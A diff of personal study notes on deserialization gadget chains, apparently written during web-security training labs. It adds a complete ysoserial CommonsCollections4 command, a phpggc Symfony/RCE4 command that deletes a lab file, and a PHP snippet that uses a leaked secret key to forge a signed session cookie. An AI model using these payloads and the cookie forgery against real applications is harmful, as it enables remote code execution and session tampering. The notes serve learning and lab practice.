@@ -2,7 +2,20 @@ gadget are codes that are present in application
 one gadget can not do harm but if we can chain them together we can exploit a wide range of exploits
 
 eg --> ysoserial tools for java deserilization
-phpggc for php deserialization 
+ava -jar ysoserial-all\(1\).jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED CommonsCollections4 'rm /home/carlos/morale.txt' | base64 
 
+
+phpggc for php deserialization 
+we can use secret key from phpinfo.php to sign any key using pho script as 
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
 
 working with documneted explits-----> using documengtation to get idea how we can exploit it
+use public documneted expploits or create code from documentations
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++DEVELOPING OUR OWN CODE++++++++++++++++++++++++++++++++++
